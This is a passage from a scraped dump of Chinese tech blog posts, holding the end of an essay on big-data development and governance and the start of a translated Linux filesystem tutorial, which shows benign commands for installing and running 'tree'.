id=\"w1\">大数据开发</h2>\n<p>大数据开发，有几个阶段：</p>\n<p>1.数据采集【原始数据】</p>\n<p>2.数据汇聚【经过清洗合并的可用数据】</p>\n<p>3.数据转换和映射【经过分类，提取的专项主题数据】</p>\n<p>4.数据应用 【提供api 智能系统  应用系统等】</p>\n<p><strong>数据采集</strong></p>\n<p>数据采集有线上和线下两种方式，线上一般通过爬虫、通过抓取，或者通过已有应用系统的采集，在这个阶段，我们可以做一个大数据采集平台，依托自动爬虫（使用python或者nodejs制作爬虫软件），ETL工具、或者自定义的抽取转换引擎，从文件中、数据库中、网页中专项爬取数据，如果这一步通过自动化系统来做的话，可以很方便的管理所有的原始数据，并且从数据的开始对数据进行标签采集，可以规范开发人员的工作。并且目标数据源可以更方便的管理。</p>\n<p>数据采集的难点在于多数据源，例如mysql、postgresql、sqlserver 、 mongodb 、sqllite。还有本地文件、excel统计文档、甚至是doc文件。如何将他们规整的、有方案的整理进我们的大数据流程中也是必不可缺的一环。</p>\n<p><strong>数据汇聚</strong></p>\n<p>数据的汇聚是大数据流程最关键的一步，你可以在这里加上数据标准化，你也可以在这里做数据清洗，数据合并，还可以在这一步将数据存档，将确认可用的数据经过可监控的流程进行整理归类，这里产出的所有数据就是整个公司的数据资产了，到了一定的量就是一笔固定资产。</p>\n<p>数据汇聚的难点在于如何标准化数据，例如表名标准化，表的标签分类，表的用途，数据的量，是否有数据增量？，数据是否可用？ 需要在业务上下很大的功夫，必要时还要引入智能化处理，例如根据内容训练结果自动打标签，自动分配推荐表名、表字段名等。还有如何从原始数据中导入数据等。</p>\n<p><strong>数据转换和映射</strong></p>\n<p>经过数据汇聚的数据资产如何提供给具体的使用方使用？在这一步，主要就是考虑数据如何应用，如何将两个？三个？数据表转换成一张能够提供服务的数据。然后定期更新增量。</p>\n<p>经过前面的那几步，在这一步难点并不太多了，如何转换数据与如何清洗数据、标准数据无二，将两个字段的值转换成一个字段，或者根据多个可用表统计出一张图表数据等等。</p>\n<p><strong>数据应用</strong></p>\n<p>数据的应用方式很多，有对外的、有对内的，如果拥有了前期的大量数据资产，通过restful API提供给用户？或者提供流式引擎 KAFKA 给应用消费? 或者直接组成专题数据，供自己的应用查询？这里对数据资产的要求比较高，所以前期的工作做好了，这里的自由度很高。</p>\n<p><strong>总结：大数据开发的难点</strong></p>\n<p>大数据开发的难点主要是监控，怎么样规划开发人员的工作？开发人员随随便便采集了一堆垃圾数据，并且直连数据库。 短期来看，这些问题比较小，可以矫正。 但是在资产的量不断增加的时候，这就是一颗定时炸弹，随时会引爆，然后引发一系列对数据资产的影响，例如数据混乱带来的就是数据资产的价值下降，客户信任度变低。</p>\n<p>如何监控开发人员的开发流程？</p>\n<p>答案只能是自动化平台，只有自动化平台能够做到让开发人员感到舒心的同时，接受新的事务，抛弃手动时代。</p>\n<p>这就是前端开发工程师在大数据行业中所占有的优势点，如何制作交互良好的可视化操作界面？如何将现有的工作流程、工作需求变成一个个的可视化操作界面？ 可不可以使用智能化取代一些无脑的操作？</p>\n<p>从一定意义上来说，大数据开发中，我个人认为前端开发工程师占据着更重要的位置，仅次于大数据开发工程师。至于后台开发，系统开发是第三位的。好的交互至关重要，如何转换数据，如何抽取数据，一定程度上，都是有先人踩过的坑，例如kettle，再例如kafka，pipeline ，解决方案众多。关键是如何交互？ 怎么样变现为可视化界面？ 这是一个重要的课题。</p>\n<p>现有的各位朋友的侧重点不同，认为前端的角色都是可有可无，我觉得是错误的，后台的确很重要，但是后台的解决方案多。 前端实际的地位更重要，但是基本无开源的解决方案，如果不够重视前端开发， 面临的问题就是交互很烂，界面烂，体验差，导致开发人员的排斥，而可视化这块的知识点众多，对开发人员的素质要求更高。</p>\n<h2 id=\"w1\">大数据治理</h2>\n<p>大数据治理应该贯穿整个大数据开发流程，它有扮演着重要的角色，浅略的介绍几点：</p>\n<p>数据血缘</p>\n<p>数据质量审查</p>\n<p>全平台监控</p>\n<p><strong>数据血缘</strong></p>\n<p>从数据血缘说起，数据血缘应该是大数据治理的入口，通过一张表，能够清晰看见它的来龙去脉，字段的拆分，清洗过程，表的流转，数据的量的变化，都应该从数据血缘出发，我个人认为，大数据治理整个的目标就是这个数据血缘，从数据血缘能够有监控全局的能力。<strong><br>\n</strong></p>\n<p>数据血缘是依托于大数据开发过程的，它包围着整个大数据开发过程，每一步开发的历史，数据导入的历史，都应该有相应的记录，数据血缘在数据资产有一定规模时，基本必不可少。</p>\n<p><strong>数据质量审查</strong></p>\n<p>数据开发中，每一个模型（表）创建的结束，都应该有一个数据质量审查的过程，在体系大的环境中，还应该在关键步骤添加审批，例如在数据转换和映射这一步，涉及到客户的数据提供，应该建立一个完善的数据质量审查制度，帮助企业第一时间发现数据存在的问题，在数据发生问题时也能第一时间看到问题的所在，并从根源解决问题，而不是盲目的通过连接数据库一遍一遍的查询sql。</p>\n<p><strong>全平台监控</strong></p>\n<p>监控呢，其实包含了很多的点，例如应用监控，数据监控，预警系统，工单系统等，对我们接管的每个数据源、数据表都需要做到实时监控，一旦发生殆机，或者发生停电，能够第一时间电话或者短信通知到具体负责人，这里可以借鉴一些自动化运维平台的经验的，监控约等于运维，好的监控提供的数据资产的保护也是很重要的。</p>\n<h2 id=\"w1\"></h2>\n<h2 id=\"w1\">大数据可视化</h2>\n<p>大数据可视化不仅仅是图表的展现，大数据可视化不仅仅是图表的展现，大数据可视化不仅仅是图表的展现，重要的事说三遍，大数据可视化归类的数据开发中，有一部分属于应用类，有一部分属于开发类。</p>\n<p>在开发中，大数据可视化扮演的是可视化操作的角色， 如何通过可视化的模式建立模型？ 如何通过拖拉拽，或者立体操作来实现数据质量的可操作性？ 画两个表格加几个按钮实现复杂的操作流程是不现实的。</p>\n<p>在可视化应用中，更多的也有如何转换数据，如何展示数据，图表是其中的一部分，平时更多的工作还是对数据的分析，怎么样更直观的表达数据？这需要对数据有深刻的理解，对业务有深刻的理解，才能做出合适的可视化应用。</p>\n<p><strong>智能的可视化平台</strong></p>\n<p>可视化是可以被再可视化的，例如superset，通过操作sql实现图表，有一些产品甚至能做到根据数据的内容智能分类，推荐图表类型，实时的进行可视化开发，这样的功能才是可视化现有的发展方向，我们需要大量的可视化内容来对公司发生产出，例如服装行业，销售部门：进货出货，颜色搭配对用户的影响，季节对选择的影响   生产部门：布料价格走势？  产能和效率的数据统计？  等等，每一个部门都可以有一个数据大屏，可以通过平台任意规划自己的大屏，所有人每天能够关注到自己的领域动向，这才是大数据可视化应用的具体意义。</p>\n<h2 id=\"w1\">写在最后</h2>\n<p>洋洋洒洒写了很多，对我近两年的所见所闻所学所想进行了一些总结，有些童鞋会问，不是技术么？为什么没有代码？   博主要说，代码博主要学的，要写的，但是与工作无关，代码是我个人的技能，个人傍身，实现个人想法的重要技能。 但是，代码与业务的关系不大，在工作中，懂业务的人代码写的更好，因为他知道公司想要什么。 如果你业务很差，那也没关系，你代码好就行了呀，根据别人的交代干活，也是很不错的。技术和业务是相辅相成的，稍后博主总结代码的精进。</p>\n<p>写完了，博主的焦虑一丝未少，我的代码规范性不够，目前技术栈js、java、nodejs、python 。</p>\n<p>主业js熟练度80%吧，正在研究阮一峰的es6（看的差不多）和vuejs的源码（有点搁浅），vuejs算是中等，css和布局方面可以说还可以，另外d3.js，go.js都是处于会用，能干活。 nodejs呢，express和koa无问题，看过一些express的源代码，还写过两个中间件。</p>\n<p>java、python都处于能做项目的程度，目前也不想抽很多精力去深入它们，就想要保持在想用能用的地步吧。</p>\n<p>未来的几年，博主努力工作，多学学人工智能、大数据开发的知识，未来这块应该还有一些热度的吧。</p>\n<p>最后，和大家共勉，更希望大家能给一些规划建议，三人行，必有我师焉。</p>\n\r\n        \r\n        \r\n        \n    <div class=\"post-adds\">\n        <span data-post-id=\"114185\" class=\" btn-bluet-bigger href-style vote-post-up   register-user-only \"><i class=\"fa  fa-thumbs-o-up\"></i> <h10 id=\"114185votetotal\">1</h10> 赞</span>\n        <span data-book-type=\"1\" data-site-id=\"2\" data-item-id=\"114185\" data-item-type=\"1\" class=\" btn-bluet-bigger href-style bookmark-btn  register-user-only \"><i class=\"fa fa-bookmark-o  \"></i> 1 收藏</span>\n\n                    <a href=\"#article-comment\"><span class=\"btn-bluet-bigger href-style hide-on-480\"><i class=\"fa fa-comments-o\"></i>  评论</span></a>\n        \n        \n        \n        <!-- JiaThis Button BEGIN -->\n        <div class=\"jiathis_style_24x24\" style=\"display: inline-flex; position: relative; margin: 0; clear: both;float: right;\">\n            <a class=\"jiathis_button_tsina\"></a>\n            <a class=\"jiathis_button_weixin\"></a>\n            <a class=\"jiathis_button_qzone\"></a>\n            <a class=\"jiathis_button_fb hide-on-480\"></a>\n            <a href=\"http://www.jiathis.com/share?uid=1745061\" class=\"jiathis jiathis_txt jiathis_separator jtico jtico_jiathis\" target=\"_blank\"></a>\n        </div>\n\n    </div>\n\n\n\n\r\n        <!-- BEGIN #author-bio -->\r\n\r\n\r\n<!-- END #author-bio -->\r\n\t</div>", "front_image_path": "full/69c52b7ee4a3c96048e034a1f1868b3b4be72871.jpg"},{"url_object_id": "b712fbfeffbfaff779433029fcdbb8d8", "title": ["Linux 文件系统详解"], "url": "http://blog.jobbole.com/114189/", "create_date": "2018/07/02", "front_image_url": ["http://jbcdn2.b0.upaiyun.com/2018/01/1b8322e1daff605d71fc81e724421f17.jpg"], "praise_nums": "1", "comment_nums": 0, "fav_nums": 2, "tags": "IT技术, Linux", "content": "<div class=\"entry\">\r\n\r\n        \t\t\t<div class=\"textwidget\"></div>\n\t\t\r\n\t\t<div class=\"copyright-area\">原文出处： <a ref=\"nofollow\" target=\"_blank\" href=\"https://www.linux.com/blog/learn/intro-to-linux/2018/4/linux-filesystem-explained\">Paul Brown</a>   译文出处：<a target=\"_blank\" href=\"https://linux.cn/article-9798-1.html\">Linux中国/amwps290</a>   </div><blockquote><p>这篇教程将帮你快速了解 Linux 文件系统。</p></blockquote>\n<p>早在 1996 年，在真正理解文件系统的结构之前，我就学会了如何在我崭新的 Linux 上安装软件。这是一个问题，但对程序来说不是大问题，因为即使我不知道实际的可执行文件在哪里，它们也会神奇地工作。问题在于文档。</p>\n<p>你知道，那时候，Linux 不是像今天这样直观、用户友好的系统。你必须读很多东西。你必须知道你的 CRT 显示器的扫描频率以及拨号调制解调器的噪音来龙去脉，以及其他数以百计的事情。 我很快就意识到我需要花一些时间来掌握目录的组织方式以及 <code>/etc</code>（不是用于“其它”文件），<code>/usr</code>（不是用于“用户”文件）和 <code>/bin</code> （不是“垃圾桶”）的意思。</p>\n<p>本教程将帮助你比我当时更快地了解这些。</p>\n<h3 id=\"toc_1\">结构</h3>\n<p>从终端窗口探索 Linux 文件系统是有道理的，这并不是因为作者是一个脾气暴躁的老人，并且对新孩子和他们漂亮的图形工具不以为然（尽管某些事实如此），而是因为终端，尽管只是文本界面，才是更好地显示 Linux 目录树结构的工具。</p>\n<p>事实上，帮助你了解这一切的、应该首先安装的第一个工具的名为：<code>tree</code>。如果你正在使用 Ubuntu 或 Debian ，你可以：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b622efe67361750015518\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsudo apt install tree\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b622efe67361750015518-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b622efe67361750015518-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b622efe67361750015518-1\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">apt </span><span class=\"crayon-e\">install </span><span class=\"crayon-i\">tree</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b622efe67361750015518-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>在 Red Hat 或 Fedora :</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b622efe6736a925125220\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsudo dnf install tree\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b622efe6736a925125220-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b622efe6736a925125220-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b622efe6736a925125220-1\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">dnf </span><span class=\"crayon-e\">install </span><span class=\"crayon-i\">tree</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b622efe6736a925125220-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>对于 SUSE/openSUSE 可以使用 <code>zypper</code>：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b622efe6736d272285095\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsudo zypper install tree\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b622efe6736d272285095-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b622efe6736d272285095-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b622efe6736d272285095-1\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-e\">zypper </span><span class=\"crayon-e\">install </span><span class=\"crayon-i\">tree</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b622efe6736d272285095-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>对于使用 Arch （Manjaro，Antergos，等等）使用：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b622efe67371149439467\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\nsudo pacman -S tree\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b622efe67371149439467-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b622efe67371149439467-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b622efe67371149439467-1\"><span class=\"crayon-e\">sudo </span><span class=\"crayon-v\">pacman</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">S</span><span class=\"crayon-h\"> </span><span class=\"crayon-i\">tree</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b622efe67371149439467-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0004 seconds] -->\r\n<p>……等等。</p>\n<p>一旦安装好，在终端窗口运行 <code>tree</code> 命令：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b622efe67374853012618\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ntree /\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b622efe67374853012618-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b622efe67374853012618-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b622efe67374853012618-1\"><span class=\"crayon-v\">tree</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span></div><div class=\"crayon-line crayon-striped-line\" id=\"crayon-5b622efe67374853012618-2\"> </div></div></td>\r\n\t\t\t\t\t</tr>\r\n\t\t\t\t</table>\r\n\t\t\t</div>\r\n\t\t</div>\r\n<!-- [Format Time: 0.0003 seconds] -->\r\n<p>上述指令中的 <code>/</code> 指的是根目录。系统中的其他目录都是从根目录分支而出，当你运行 <code>tree</code> 命令，并且告诉它从根目录开始，那么你就可以看到整个目录树，系统中的所有目录及其子目录，还有它们的文件。</p>\n<p>如果你已经使用你的系统有一段时间了，这可能需要一段时间，因为即使你自己还没有生成很多文件，Linux 系统及其应用程序总是在记录、缓存和存储各种临时文件。文件系统中的条目数量会快速增长。</p>\n<p>不过，不要感到不知所措。 相反，试试这个：</p><!-- Crayon Syntax Highlighter v2.7.1.1 -->\r\n\r\n\t\t<div id=\"crayon-5b622efe67378568670428\" class=\"crayon-syntax crayon-theme-github crayon-font-monaco crayon-os-pc print-yes notranslate\" data-settings=\" minimize scroll-always\" style=\" margin-top: 12px; margin-bottom: 12px; font-size: 13px !important; line-height: 15px !important;\">\r\n\t\t\r\n\t\t\t<div class=\"crayon-toolbar\" data-settings=\" show\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><span class=\"crayon-title\"></span>\r\n\t\t\t<div class=\"crayon-tools\" style=\"font-size: 13px !important;height: 19.5px !important; line-height: 19.5px !important;\"><div class=\"crayon-button crayon-nums-button\" title=\"切换是否显示行编号\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-plain-button\" title=\"纯文本显示代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-wrap-button\" title=\"切换自动换行\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-expand-button\" title=\"点击展开代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-copy-button\" title=\"复制代码\"><div class=\"crayon-button-icon\"></div></div><div class=\"crayon-button crayon-popup-button\" title=\"在新窗口中显示代码\"><div class=\"crayon-button-icon\"></div></div></div></div>\r\n\t\t\t<div class=\"crayon-info\" style=\"min-height: 18.2px !important; line-height: 18.2px !important;\"></div>\r\n\t\t\t<div class=\"crayon-plain-wrap\"><textarea wrap=\"soft\" class=\"crayon-plain print-no\" data-settings=\"dblclick\" readonly style=\"-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 13px !important; line-height: 15px !important;\">\ntree -L 1 /\r\n</textarea></div>\r\n\t\t\t<div class=\"crayon-main\" style=\"\">\r\n\t\t\t\t<table class=\"crayon-table\">\r\n\t\t\t\t\t<tr class=\"crayon-row\">\r\n\t\t\t\t<td class=\"crayon-nums \" data-settings=\"show\">\r\n\t\t\t\t\t<div class=\"crayon-nums-content\" style=\"font-size: 13px !important; line-height: 15px !important;\"><div class=\"crayon-num\" data-line=\"crayon-5b622efe67378568670428-1\">1</div><div class=\"crayon-num crayon-striped-num\" data-line=\"crayon-5b622efe67378568670428-2\">2</div></div>\r\n\t\t\t\t</td>\r\n\t\t\t\t\t\t<td class=\"crayon-code\"><div class=\"crayon-pre\" style=\"font-size: 13px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;\"><div class=\"crayon-line\" id=\"crayon-5b622efe67378568670428-1\"><span class=\"crayon-v\">tree</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">-</span><span class=\"crayon-i\">L</span><span class=\"crayon-h\"> </span><span class=\"crayon-cn\">1</span><span class=\"crayon-h\"> </span><span class=\"crayon-o\">/</span></div><div class=\"crayon-line crayon-striped-line\" 